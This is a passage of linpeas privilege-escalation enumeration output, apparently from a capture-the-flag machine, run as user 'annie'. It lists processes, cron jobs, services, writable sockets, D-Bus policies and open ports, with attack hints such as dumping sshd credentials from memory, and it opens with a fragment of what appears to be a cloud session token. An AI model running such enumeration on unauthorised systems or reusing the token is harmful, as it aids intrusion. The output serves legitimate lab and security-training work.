2WEJbcBy5WH24STwQFZ4XqXGNgSqOev8L5gloU40m4YhuYsAhCzOtPOBkI204yCKm2pl+YmryO14tbee2fxhRewSeyeQgIpc5mQ9CU3/UJpUn5wHhhbRAdHfpxp0TAzsj8SkL+UV6za1+2LmiDg9l8dXOYh3oIVGN1pocQs3zSiIE+Nmlf17QWL6kb3PFGGh2OA0+Yyi4BSOA==",
  "Expiration" : "2024-06-18T20:25:41Z"
}
══╣ SSM Runnig
annie     4310  0.0  0.1  15240  1152 pts/0    S+   07:10   0:00 sed s,ssm-agent,?[1;31m&?[0m,                                


                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                            
                ╚════════════════════════════════════════════════╝                                                            
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes   
root         1  0.0  0.8 159576  8776 ?        Ss   04:06   0:06 /sbin/init noprompt                                          
root       230  0.0  2.0 120416 20900 ?        S<s  04:07   0:03 /lib/systemd/systemd-journald
root       247  0.0  0.5  47124  5460 ?        Ss   04:07   0:01 /lib/systemd/systemd-udevd
systemd+   303  0.0  0.3 219704  3124 ?        Ssl  04:07   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   307  0.0  0.5  79928  5148 ?        Ss   04:07   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
root       320  0.0  0.6 286356  6756 ?        Ssl  04:07   0:02 /usr/lib/accountsservice/accounts-daemon[0m
root       321  0.0  1.0 502656 10296 ?        Ssl  04:07   0:00 /usr/lib/udisks2/udisksd
root       322  0.0  0.9 434320  9416 ?        Ssl  04:07   0:00 /usr/sbin/ModemManager --filter-policy=strict
root       325  0.0  0.3  11600  3216 ?        Ss   04:07   0:00 /bin/bash /root/.display10.sh
root       336  0.0  6.1 230576 61992 ?        S    04:07   0:07  _ /usr/bin/Xvfb :10 -ac -screen 0 1024x768x24
root       330  0.0  0.3  30036  3248 ?        Ss   04:07   0:00 /usr/sbin/cron -f
avahi      339  0.0  0.0  47084   344 ?        S    04:07   0:00  _ avahi-daemon: chroot helper
message+   332  0.1  0.5  50844  5424 ?        Ss   04:07   0:12 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       348  0.0  0.5  45240  5308 ?        Ss   04:07   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
syslog     350  0.0  0.4 271460  4464 ?        Ssl  04:07   0:00 /usr/sbin/rsyslogd -n
root       351  0.0  1.5 479228 15948 ?        Ssl  04:07   0:01 /usr/sbin/NetworkManager --no-daemon[0m
root       353  0.0  0.5  70520  5988 ?        Ss   04:07   0:05 /lib/systemd/systemd-logind
root       354  0.0  1.6 169100 17052 ?        Ssl  04:07   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       371  0.0  0.8 292920  8628 ?        Ssl  04:07   0:01 /usr/lib/policykit-1/polkitd --no-debug
systemd+   375  0.0  0.4  70500  4884 ?        Ss   04:07   0:00 /lib/systemd/systemd-resolved
root       396  0.0  0.5  72308  5696 ?        Ss   04:07   0:00 /usr/sbin/sshd -D
annie     4694  0.0  0.4 110200  4180 ?        S    04:41   0:00      _ sshd: annie@pts/0
annie     4697  0.0  0.5  21384  5036 pts/0    Ss   04:41   0:00          _ -bash
annie      838  0.4  0.2   5340  2584 pts/0    S+   07:10   0:00              _ sh linpeas.sh
annie     4324  0.0  0.0   5340   924 pts/0    S+   07:10   0:00                  _ sh linpeas.sh
annie     4328  0.0  0.3  38532  3736 pts/0    R+   07:10   0:00                  |   _ ps fauxwww
annie     4327  0.0  0.0   5340   924 pts/0    S+   07:10   0:00                  _ sh linpeas.sh
root       414  0.0  0.8 300052  8316 ?        Ssl  04:07   0:01 /usr/sbin/gdm3
gdm       1851  0.0  0.5 203740  5960 tty1     Ssl+ 04:10   0:00      _ /usr/lib/gdm3/gdm-x-session gnome-session --autostart /usr/share/gdm/greeter/autostart
gdm       1853  0.0  4.8 327608 49024 tty1     Sl+  04:10   0:09          _ /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/115/gdm/Xauthority -background none -noreset -keeptty -verbose 3
gdm       1863  0.0  1.3 624064 13320 tty1     Sl+  04:10   0:00          _ /usr/lib/gnome-session/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart
gdm       1885  0.0 16.6 2888068 167700 tty1   Sl+  04:10   0:07              _ /usr/bin/gnome-shell
gdm       1905  0.0  0.7 426708  7700 tty1     Sl   04:10   0:00              |   _ ibus-daemon --xim --panel disable
gdm       1911  0.0  0.6 272352  6624 tty1     Sl   04:10   0:00              |       _ /usr/lib/ibus/ibus-dconf
gdm       2122  0.0  0.5 196496  5912 tty1     Sl   04:10   0:00              |       _ /usr/lib/ibus/ibus-engine-simple
gdm       1940  0.0  2.1 485580 21336 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-xsettings
gdm       1941  0.0  0.5 269680  5860 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-a11y-settings
gdm       1943  0.0  2.0 335288 20132 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-clipboard
gdm       1946  0.0  2.1 650200 21600 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-color
gdm       1947  0.0  1.3 385324 13964 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-datetime
gdm       1948  0.0  0.5 275344  5564 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-housekeeping
gdm       1960  0.0  2.1 498104 21380 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-keyboard
gdm       1963  0.0  2.3 1073420 23616 tty1    Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-media-keys
gdm       1976  0.0  0.4 193604  4600 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-mouse
gdm       1977  0.0  2.1 582448 21996 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-power
gdm       1980  0.0  0.8 258628  8792 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-print-notifications
gdm       1981  0.0  0.4 193624  4672 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-rfkill
gdm       1986  0.0  0.4 267340  4772 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-screensaver-proxy
gdm       1988  0.0  0.8 296640  8252 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-sharing
gdm       1991  0.0  0.9 443320  9168 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-smartcard
gdm       2001  0.0  0.7 326496  8020 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-sound
gdm       2004  0.0  2.1 420036 21176 tty1     Sl+  04:10   0:00              _ /usr/lib/gnome-settings-daemon/gsd-wacom
gdm        454  0.0  0.7  76672  7772 ?        Ss   04:07   0:00 /lib/systemd/systemd --user
gdm        457  0.0  0.2 113432  2104 ?        S    04:07   0:00  _ (sd-pam)
gdm        507  0.0  0.4  50440  4724 ?        Ss   04:07   0:02  _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
gdm        643  0.0  0.6 349324  6420 ?        Ssl  04:07   0:00  _ /usr/lib/at-spi2-core/at-spi-bus-launcher
gdm        648  0.0  0.4  50068  4288 ?        S    04:07   0:00  |   _ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
gdm        653  0.0  1.2 1235428 12856 ?       Ssl  04:07   0:00  _ /usr/bin/pulseaudio --daemonize=no
gdm       1918  0.0  0.5 270296  5996 ?        Sl   04:10   0:00  _ /usr/lib/ibus/ibus-portal
root       468  0.0  0.2  14672  2336 ttyS0    Ss+  04:07   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       636  0.0  0.8 305604  8404 ?        Ssl  04:07   0:00 /usr/lib/upower/upowerd
rtkit      655  0.0  0.3 183516  3020 ?        SNsl 04:07   0:00 /usr/lib/rtkit/rtkit-daemon
  └─(Caps) 0x0000000000800004=cap_dac_read_search,cap_sys_nice
gdm       1914  0.0  2.0 335656 20908 tty1     Sl   04:10   0:00 /usr/lib/ibus/ibus-x11 --kill-daemon
root      1938  0.0  0.6 288480  6748 ?        Ssl  04:10   0:00 /usr/lib/x86_64-linux-gnu/boltd
root      1939  0.0  1.3 365188 13712 ?        Ssl  04:10   0:00 /usr/lib/packagekit/packagekitd
colord    2053  0.0  1.3 316116 13628 ?        Ssl  04:10   0:00 /usr/lib/colord/colord
annie     4662  0.0  0.7  76532  7476 ?        Ss   04:41   0:00 /lib/systemd/systemd --user
annie     4663  0.0  0.2 195556  2264 ?        S    04:41   0:00  _ (sd-pam)
root       765  0.1  1.8 600048 18160 ?        Ssl  07:10   0:00 /usr/bin/anydesk --service
gdm        768  0.1  2.1 724204 21480 ?        Ssl  07:10   0:00  _ /usr/bin/anydesk --tray
annie      791  0.0  0.3  11600  3204 ?        Ss   07:10   0:00 /bin/bash /home/annie/.anydesk.sh
annie      792  0.2  3.0 810708 30824 ?        Sl   07:10   0:00  _ /usr/bin/anydesk
annie      802  0.0  0.2  45848  2252 ?        S    07:10   0:00 dbus-launch --autolaunch=9035659da70a4b8ebcd6691cfa3ab648 --binary-syntax --close-stderr
annie      803  0.0  0.2  49804  2796 ?        Ss   07:10   0:00 /usr/bin/dbus-daemon --syslog-only --fork --print-pid 5 --print-address 7 --session

╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                  
                                                                                                                              
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                     
Proc 303 with ppid 1 is run by user systemd-timesync but the ppid user is root                                                
Proc 307 with ppid 1 is run by user systemd-network but the ppid user is root
Proc 331 with ppid 1 is run by user avahi but the ppid user is root
Proc 332 with ppid 1 is run by user messagebus but the ppid user is root
Proc 350 with ppid 1 is run by user syslog but the ppid user is root
Proc 375 with ppid 1 is run by user systemd-resolve but the ppid user is root
Proc 454 with ppid 1 is run by user gdm but the ppid user is root
Proc 655 with ppid 1 is run by user rtkit but the ppid user is root
Proc 768 with ppid 765 is run by user gdm but the ppid user is root
Proc 791 with ppid 1 is run by user annie but the ppid user is root
Proc 802 with ppid 1 is run by user annie but the ppid user is root
Proc 803 with ppid 1 is run by user annie but the ppid user is root
Proc 1851 with ppid 1846 is run by user gdm but the ppid user is root
Proc 1914 with ppid 1 is run by user gdm but the ppid user is root
Proc 2053 with ppid 1 is run by user colord but the ppid user is root
Proc 4662 with ppid 1 is run by user annie but the ppid user is root
Proc 4694 with ppid 4583 is run by user annie but the ppid user is root

╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                            
COMMAND    PID  TID             USER   FD      TYPE             DEVICE SIZE/OFF       NODE NAME                               

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory                            
gdm-password Not Found                                                                                                        
gnome-keyring-daemon Not Found                                                                                                
lightdm Not Found                                                                                                             
vsftpd Not Found                                                                                                              
apache2 Not Found                                                                                                             
sshd: process found (dump creds from memory as root)                                                                          

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                        
/usr/bin/crontab                                                                                                              
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 15  2017 /etc/crontab                                                                      

/etc/cron.d:
total 16
drwxr-xr-x   2 root root 4096 Mar 23  2022 .
drwxr-xr-x 109 root root 4096 May 14  2022 ..
-rw-r--r--   1 root root  102 Nov 15  2017 .placeholder
-rw-r--r--   1 root root  190 Mar 23  2022 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root 4096 Mar 23  2022 .
drwxr-xr-x 109 root root 4096 May 14  2022 ..
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root  384 Dec 12  2012 cracklib-runtime
-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
-rw-r--r--   1 root root  102 Nov 15  2017 .placeholder
-rwxr-xr-x   1 root root 3477 Feb 20  2018 popularity-contest

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Mar 23  2022 .
drwxr-xr-x 109 root root 4096 May 14  2022 ..
-rw-r--r--   1 root root  102 Nov 15  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Mar 23  2022 .
drwxr-xr-x 109 root root 4096 May 14  2022 ..
-rw-r--r--   1 root root  102 Nov 15  2017 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x   2 root root 4096 Mar 23  2022 .
drwxr-xr-x 109 root root 4096 May 14  2022 ..
-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
-rw-r--r--   1 root root  102 Nov 15  2017 .placeholder

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths                                
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                             

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services                                                   
/etc/systemd/system/anydesk-annie.service could be executing some relative path                                               
/etc/systemd/system/display10.service could be executing some relative path
/etc/systemd/system/multi-user.target.wants/anydesk-annie.service could be executing some relative path
/etc/systemd/system/multi-user.target.wants/display10.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                     
NEXT                         LEFT         LAST                         PASSED       UNIT                         ACTIVATES    
Tue 2024-06-18 11:17:47 PDT  4h 7min left Tue 2024-06-18 04:35:01 PDT  2h 35min ago ua-timer.timer               ua-timer.service
Tue 2024-06-18 15:45:22 PDT  8h left      Tue 2024-06-18 04:07:08 PDT  3h 3min ago  motd-news.timer              motd-news.service
Tue 2024-06-18 16:06:23 PDT  8h left      Tue 2024-06-18 04:07:08 PDT  3h 3min ago  apt-daily.timer              apt-daily.service
Wed 2024-06-19 04:22:02 PDT  21h left     Tue 2024-06-18 04:22:02 PDT  2h 48min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Wed 2024-06-19 06:59:21 PDT  23h left     Tue 2024-06-18 06:02:19 PDT  1h 8min ago  apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2024-06-24 00:00:00 PDT  5 days left  Tue 2024-06-18 04:07:08 PDT  3h 3min ago  fstrim.timer                 fstrim.service
n/a                          n/a          n/a                          n/a          ua-license-check.timer       ua-license-check.service
n/a                          n/a          n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers                                                     
                                                                                                                              
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                    
/etc/systemd/system/sockets.target.wants/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket      
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request
/lib/systemd/system/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log                                                                                                                    
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout                                                                                                                             
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket                                                                                                                             
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets                                                    
/run/avahi-daemon/socket                                                                                                      
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/user/1000/bus
  └─(Read Write)
/run/user/1000/gnupg/S.dirmngr
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.browser
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.extra
  └─(Read Write)
/run/user/1000/gnupg/S.gpg-agent.ssh
  └─(Read Write)
/run/user/1000/systemd/notify
  └─(Read Write)
/run/user/1000/systemd/private
  └─(Read Write)
/run/user/115/bus
/run/user/115/gnupg/S.dirmngr
/run/user/115/gnupg/S.gpg-agent
/run/user/115/gnupg/S.gpg-agent.browser
/run/user/115/gnupg/S.gpg-agent.extra
/run/user/115/gnupg/S.gpg-agent.ssh
/run/user/115/pulse/native
/run/user/115/systemd/private
/run/uuidd/request
  └─(Read Write)
/tmp/dbus-0Mp21jha
/tmp/dbus-5laMu2rM
/tmp/dbus-7oeaAjNn
/tmp/dbus-aJfgF7Nl
/tmp/dbus-AqFSm9Hw
/tmp/dbus-BGI8WXGb
/tmp/dbus-Bk7AvxNyNG
@/tmp/dbus-Bk7AvxNyNG
/tmp/dbus-ChWQpRBc
/tmp/dbus-CSc2c5lS
/tmp/dbus-cu1kSiE2
/tmp/dbus-CWDMMxNh
/tmp/dbus-daBFCtkcCi
/tmp/dbus-df0AXfnH
/tmp/dbus-ERmdrmFx
/tmp/dbus-G6KHbAso
/tmp/dbus-gG9rk4Nq
/tmp/dbus-gM0j0DFS
/tmp/dbus-gsIYXCVA
/tmp/dbus-H6HK4NWP
/tmp/dbus-IEISCA5J
/tmp/dbus-JLsqySu4
/tmp/dbus-kpuMo9OC
/tmp/dbus-KYSGttwH
/tmp/dbus-LQq42qgv
/tmp/dbus-lvb4eogK
/tmp/dbus-MhS3AOvQ
/tmp/dbus-nEF5jVSq
/tmp/dbus-nLU4IOpN
/tmp/dbus-o1YNsu1U
/tmp/dbus-o7vRy6aA
/tmp/dbus-OOlGHCHn
/tmp/dbus-P4gkExwA
/tmp/dbus-pD6KMSAh
/tmp/dbus-Pp70UAP2
/tmp/dbus-Q9Vx3I85
/tmp/dbus-qhrKcNqb
/tmp/dbus-QJWDVC0u
/tmp/dbus-qrfW1MBp
/tmp/dbus-S2Q2tpoE
/tmp/dbus-sbJNXyQw
/tmp/dbus-TPL3aNmf
/tmp/dbus-URT3iJJy
/tmp/dbus-uyAFurR5
/tmp/dbus-vEnP8OfO
/tmp/dbus-viOkREbO
/tmp/dbus-w5RuoOJf
/tmp/dbus-wgx68XiP
/tmp/dbus-wLM6pbDH
/tmp/dbus-wUJawbwg
/tmp/dbus-wYt4iGrJ
/tmp/dbus-XbIBudmR
/tmp/dbus-XKnKf0Vb
/tmp/dbus-XQTl1JPQ
/tmp/dbus-XSDd6LgL
/tmp/dbus-YYVkqk6C
/tmp/.ICE-unix/1863
  └─(Read Write)
/tmp/.X11-unix/X0
  └─(Read Write)
/tmp/.X11-unix/X10
  └─(Read Write)
/tmp/.X11-unix/X1024
  └─(Read )
/var/run/dbus/system_bus_socket
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                      
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy user="avahi">)                             
Possible weak user policy found on /etc/dbus-1/system.d/avahi-dbus.conf (  <policy group="netdev">)
Possible weak user policy found on /etc/dbus-1/system.d/bluetooth.conf (  <policy group="bluetooth">
  <policy group="lp">)
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)
Possible weak user policy found on /etc/dbus-1/system.d/gdm.conf (  <policy user="gdm">)
Possible weak user policy found on /etc/dbus-1/system.d/net.hadess.SensorProxy.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.ColorManager.conf (  <policy user="colord">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.Agent.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.GeoClue2.conf (  <policy user="geoclue">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.NetworkManager.conf (        <policy user="whoopsie">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.RealtimeKit1.conf (  <policy user="rtkit">)
Possible weak user policy found on /etc/dbus-1/system.d/org.opensuse.CupsPkHelper.Mechanism.conf (  <policy user="cups-pk-helper">)                                                                                                                         
Possible weak user policy found on /etc/dbus-1/system.d/pulseaudio-system.conf (  <policy user="pulse">)
Possible weak user policy found on /etc/dbus-1/system.d/wpa_supplicant.conf (        <policy group="netdev">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                      
NAME                                       PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                                       307 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                         1 systemd         root             :1.1          init.scope                -          -                  
:1.10                                      375 systemd-resolve systemd-resolve  :1.10         systemd-resolved.service  -          -                  
:1.12                                      351 NetworkManager  root             :1.12         NetworkManager.service    -          -                  
:1.13                                      354 networkd-dispat root             :1.13         networkd-dispatcher.se…ce -          -                  
:1.17                                      414 gdm3            root             :1.17         gdm.service               -          -                  
:1.192                                    1846 gdm-session-wor root             :1.192        session-c25.scope         c25        -                  
:1.195                                    1853 Xorg            gdm              :1.195        session-c25.scope         c25        -                  
:1.197                                    1863 gnome-session-b gdm              :1.197        session-c25.scope         c25        -                  
:1.198                                    1885 gnome-shell     gdm              :1.198        session-c25.scope         c25        -                  
:1.2                                       331 avahi-daemon    avahi            :1.2          avahi-daemon.service      -          -                  
:1.201                                    1938 boltd           root             :1.201        bolt.service              -          -                  
:1.203                                    1977 gsd-power       gdm              :1.203        session-c25.scope         c25        -                  
:1.204                                    1939 packagekitd     root             :1.204        packagekit.service        -          -                  
:1.205                                    1960 gsd-keyboard    gdm              :1.205        session-c25.scope         c25        -                  
:1.206                                    1946 gsd-color       gdm              :1.206        session-c25.scope         c25        -                  
:1.207                                    2053 colord          colord           :1.207        colord.service            -          -                  
:1.208                                    1963 gsd-media-keys  gdm              :1.208        session-c25.scope         c25        -                  
:1.25                                      454 systemd         gdm              :1.25         user@115.service          -          -                  
:1.29                                      636 upowerd         root             :1.29         upower.service            -          -                  
:1.3                                       320 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
:1.31                                      655 rtkit-daemon    root             :1.31         rtkit-daemon.service      -          -                  
:1.4                                       321 udisksd         root             :1.4          udisks2.service           -          -                  
:1.5                                       322 ModemManager    root             :1.5          ModemManager.service      -          -                  
:1.6                                       353 systemd-logind  root             :1.6          systemd-logind.service    -          -                  
:1.7                                       348 wpa_supplicant  root             :1.7          wpa_supplicant.service    -          -                  
:1.753                                     765 anydesk         root             :1.753        anydesk.service           -          -                  
:1.754                                     768 anydesk         gdm              :1.754        anydesk.service           -          -                  
:1.755                                     792 anydesk         annie            :1.755        anydesk-annie.service     -          -                  
:1.8                                       371 polkitd         root             :1.8          polkit.service            -          -                  
:1.895                                    8584 busctl          annie            :1.895        session-71.scope          71         -                  
com.ubuntu.LanguageSelector                  - -               -                (activatable) -                         -         
com.ubuntu.SystemService                     - -               -                (activatable) -                         -         
com.ubuntu.WhoopsiePreferences               - -               -                (activatable) -                         -         
fi.epitest.hostap.WPASupplicant            348 wpa_supplicant  root             :1.7          wpa_supplicant.service    -          -                  
fi.w1.wpa_supplicant1                      348 wpa_supplicant  root             :1.7          wpa_supplicant.service    -          -                  
io.netplan.Netplan                           - -               -                (activatable) -                         -         
org.bluez                                    - -               -                (activatable) -                         -         
org.debian.apt                               - -               -                (activatable) -                         -         
org.freedesktop.Accounts                   320 accounts-daemon[0m root             :1.3          accounts-daemon.service   -          -                  
org.freedesktop.Avahi                      331 avahi-daemon    avahi            :1.2          avahi-daemon.service      -          -                  
org.freedesktop.ColorManager              2053 colord          colord           :1.207        colord.service            -          -                  
org.freedesktop.DBus                         1 systemd         root             -             init.scope                -          -                  
org.freedesktop.GeoClue2                     - -               -                (activatable) -                         -         
org.freedesktop.ModemManager1              322 ModemManager    root             :1.5          ModemManager.service      -          -                  
org.freedesktop.NetworkManager             351 NetworkManager  root             :1.12         NetworkManager.service    -          -                  
org.freedesktop.PackageKit                1939 packagekitd     root             :1.204        packagekit.service        -          -                  
org.freedesktop.PolicyKit1                 371 polkitd         root             :1.8          polkit.service            -          -                  
org.freedesktop.RealtimeKit1               655 rtkit-daemon    root             :1.31         rtkit-daemon.service      -          -                  
org.freedesktop.UDisks2                    321 udisksd         root             :1.4          udisks2.service           -          -                  
org.freedesktop.UPower                     636 upowerd         root             :1.29         upower.service            -          -                  
org.freedesktop.bolt                      1938 boltd           root             :1.201        bolt.service              -          -                  
org.freedesktop.hostname1                    - -               -                (activatable) -                         -         
org.freedesktop.locale1                      - -               -                (activatable) -                         -         
org.freedesktop.login1                     353 systemd-logind  root             :1.6          systemd-logind.service    -          -                  
org.freedesktop.network1                   307 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.nm_dispatcher                - -               -                (activatable) -                         -         
org.freedesktop.resolve1                   375 systemd-resolve systemd-resolve  :1.10         systemd-resolved.service  -          -                  
org.freedesktop.systemd1                     1 systemd         root             :1.1          init.scope                -          -                  
org.freedesktop.timedate1                    - -               -                (activatable) -                         -         
org.gnome.DisplayManager                   414 gdm3            root             :1.17         gdm.service               -          -                  
org.opensuse.CupsPkHelper.Mechanism          - -               -                (activatable) -                         -         


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                           
                              ╚═════════════════════╝                                                                         
╔══════════╣ Hostname, hosts and DNS
desktop                                                                                                                       
127.0.0.1       localhost
127.0.1.1       ubuntu

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                           
link-local 169.254.0.0
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:26:d4:58:bd:db brd ff:ff:ff:ff:ff:ff
    inet 10.10.159.237/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 1468sec preferred_lft 1468sec
    inet6 fe80::26:d4ff:fe58:bddb/64 scope link 
       valid_lft forever preferred_lft forever

╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                 
tcp   LISTEN  0       1                    0.0.0.0:43761          0.0.0.0:*                                                   
tcp   LISTEN  0       128            127.0.0.53%lo:53             0.0.0.0:*     
tcp   LISTEN  0       128                  0.0.0.0:22             0.0.0.0:*     
tcp   LISTEN  0       1                    0.0.0.0:7070           0.0.0.0:*     
tcp   LISTEN  0       128                     [::]:22                [::]:*     

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                            
                                                                                                                              


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                           
                               ╚═══════════════════╝                                                                          
╔══════════╣ My user
